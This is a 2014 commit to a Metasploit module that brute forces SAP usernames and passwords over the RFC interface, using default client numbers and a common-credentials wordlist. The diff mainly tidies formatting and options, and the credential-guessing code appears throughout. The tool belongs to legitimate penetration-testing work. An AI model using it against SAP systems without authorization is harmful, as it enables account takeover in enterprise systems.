b5217c1224a19a4cdea722088aab71bf69c20ed4
Meatballs <eat_meatballs@hotmail.co.uk>
2014-05-12 16:14:59 +0100

    Cleanup brute login

--- modules/auxiliary/scanner/sap/sap_rfc_brute_login.rb
+++ modules/auxiliary/scanner/sap/sap_rfc_brute_login.rb
@@ -5,8 +5,8 @@
 
 ##
 # This module is based on, inspired by, or is a port of a plugin available in the Onapsis Bizploit Opensource ERP Penetration Testing framework - http://www.onapsis.com/research-free-solutions.php.
-# Mariano Nuñez (the author of the Bizploit framework) helped me in my efforts in producing the Metasploit modules and was happy to share his knowledge and experience - a very cool guy. 
-# I’d also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis who have Beta tested the modules and provided excellent feedback. Some people just seem to enjoy hacking SAP :)
+# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts in producing the Metasploit modules and was happy to share his knowledge and experience - a very cool guy. 
+# Id also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis who have Beta tested the modules and provided excellent feedback. Some people just seem to enjoy hacking SAP :)
 ##
 
 require 'msf/core'
@@ -26,71 +26,61 @@ class Metasploit4 < Msf::Auxiliary
 
   def initialize
     super(
-           'Name'           => 'SAP RFC Brute Forcer',
-           'Version'        => '$Revision$',
-           'Description'    => %q{
-                          This module attempts to brute force the username | password via an RFC interface.
-                                  Default clients can be tested without needing to set a CLIENT.
-                                  Common/Default user and password combinations can be tested without needing to set a USERNAME, PASSWORD, USER_FILE or PASS_FILE.
-                                  The default usernames and password combinations are stored in ./data/wordlists/sap_rfc_common.txt.
-                                  This module can execute through a SAP Router if SRHOST and SRPORT values are set.
-                                  The module requires the NW RFC SDK from SAP as well as the Ruby wrapper nwrfc (http://rubygems.org/gems/nwrfc).
-                         },
-           'References'     => [[ 'URL', 'http://labs.mwrinfosecurity.com' ]],
-           'Author'         => ['nmonkee'],
-         'License'        => BSD_LICENSE
-           )
+      'Name' => 'SAP RFC Brute Forcer',
+      'Description'    => %q{
+        This module attempts to brute force the username | password via an RFC interface.
+        Default clients can be tested without needing to set a CLIENT.
+        Common/Default user and password combinations can be tested without needing to set a USERNAME, PASSWORD, USER_FILE or PASS_FILE.
+        The default usernames and password combinations are stored in ./data/wordlists/sap_rfc_common.txt.
+        This module can execute through a SAP Router if SRHOST and SRPORT values are set.
+        The module requires the NW RFC SDK from SAP as well as the Ruby wrapper nwrfc (http://rubygems.org/gems/nwrfc).
+      },
+      'References'     => [[ 'URL', 'http://labs.mwrinfosecurity.com' ]],
+      'Author'         => ['nmonkee'],
+      'License'        => BSD_LICENSE
+      )
 
       register_options(
       [
         Opt::RPORT(3342),
         OptString.new('CLIENT', [true, 'Client can be single (066), comma seperated list (000,001,066) or range (000-999)', '000,001,066']),
-              OptString.new('SRHOST', [false, 'SAP Router Address', nil]),
-              OptString.new('SRPORT', [false, 'SAP Router Port Number', nil]),
-              OptBool.new('VERBOSE', [false, "Be Verbose", false])
+        OptString.new('SRHOST', [false, 'SAP Router Address', nil]),
+        OptString.new('SRPORT', [false, 'SAP Router Port Number', nil]),
+        OptPath.new('USERPASS_FILE', [ false, "File containing users and passwords separated by space, one pair per line",
+           File.join(Msf::Config.data_directory, "wordlists", "sap_rfc_common.txt") ])
       ], self.class)
     end
 
-    def run_host(ip)
-      print_status("Brute forcing #{USER}") if datastore['USER']
-      print_status("Using provided user wordlist") if datastore['USER_FILE']
-      print_status("Using provided password wordlist") if datastore['PASS_FILE']
-      if datastore['USERPASS_FILE']
-        print_status("Using provided user/password wordlist")
-      else 
-        datastore['USERPASS_FILE'] = Msf::Config.data_directory + '/wordlists/sap_rfc_common.txt'
-        print_status("Using default sap_rfc_common.txt")
-      end
-    
-      if datastore['CLIENT'].nil?
-        print_status("Using default SAP client list")
-        client = ['000', '001', '066']
+  def run_host(ip)
+    if datastore['CLIENT'].nil?
+      print_status("Using default SAP client list")
+      clients = ['000', '001', '066']
+    else
+      if datastore['CLIENT'] =~ /^\d{3},/
+        clients = datastore['CLIENT'].split(/,/)
+        print_status("Brute forcing clients #{datastore['CLIENT']}")
+      elsif
+        datastore['CLIENT'] =~ /^\d{3}-\d{3}\z/
+        array = datastore['CLIENT'].split(/-/)
+        clients = (array.at(0)..array.at(1)).to_a
+        print_status("Brute forcing clients #{datastore['CLIENT']}")
+      elsif
+        datastore['CLIENT'] =~ /^\d{3}\z/
+        clients = datastore['CLIENT']
+        print_status("Brute forcing client #{datastore['CLIENT']}")
       else
-        if datastore['CLIENT'] =~ /^\d{3},/
-          client = datastore['CLIENT'].split(/,/)
-          print_status("Brute forcing clients #{datastore['CLIENT']}")
-        elsif 
-          datastore['CLIENT'] =~ /^\d{3}-\d{3}\z/
-          array = datastore['CLIENT'].split(/-/)
-          client = (array.at(0)..array.at(1)).to_a
-          print_status("Brute forcing clients #{datastore['CLIENT']}")
-        elsif
-          datastore['CLIENT'] =~ /^\d{3}\z/
-          client = datastore['CLIENT']
-          print_status("Brute forcing client #{datastore['CLIENT']}")
-        else  
-          print_status("Invalid CLIENT - using default SAP client list instead")
-          client = ['000', '001', '066']
-        end
-     end
+        print_status("Invalid CLIENT - using default SAP client list instead")
+        clients = ['000', '001', '066']
+      end
+    end
 
-     rport = datastore['rport'].to_s.split('')
-     sysnr = rport[2]
-     sysnr << rport[3]
-        
-   $success = false
+    rport = datastore['rport'].to_s.split('')
+    sysnr = rport[2]
+    sysnr << rport[3]
 
-     $saptbl = Msf::Ui::Console::Table.new(
+    $success = false
+
+    $saptbl = Msf::Ui::Console::Table.new(
               Msf::Ui::Console::Table::Style::Default,
               'Header'  => "[SAP] Credentials",
               'Prefix'  => "\n",
@@ -105,13 +95,13 @@ class Metasploit4 < Msf::Auxiliary
                            "pass",
                            "status"
                           ])
-   
-     client.each { |client|
+
+     clients.each { |client|
        each_user_pass do |user, pass|
          brute_user(user,client,pass,datastore['rhost'],datastore['rport'],sysnr)
        end
      }
-     
+
      if $success
        print($saptbl.to_s)
        return
@@ -119,17 +109,15 @@ class Metasploit4 < Msf::Auxiliary
    end
 
    def brute_user(user, client, pass, rhost, rport, sysnr)
-   
    ashost = rhost
-  
+
   if datastore['SRHOST']
 #    if datastore['SRPORT']
       ashost = "/H/#{datastore['SRHOST']}/H/#{rhost}"
 #    end
   end
-   
-   verbose = datastore['VERBOSE']
-   print_status("#{rhost}:#{rport} [SAP] Trying client: '#{client}'") if verbose == true
+
+   print_status("#{rhost}:#{rport} [SAP] Trying client: '#{client}'")
 
    begin
      auth_hash = {"user" => user, "passwd" => pass, "client" => client, "ashost" => ashost, "sysnr" => sysnr}
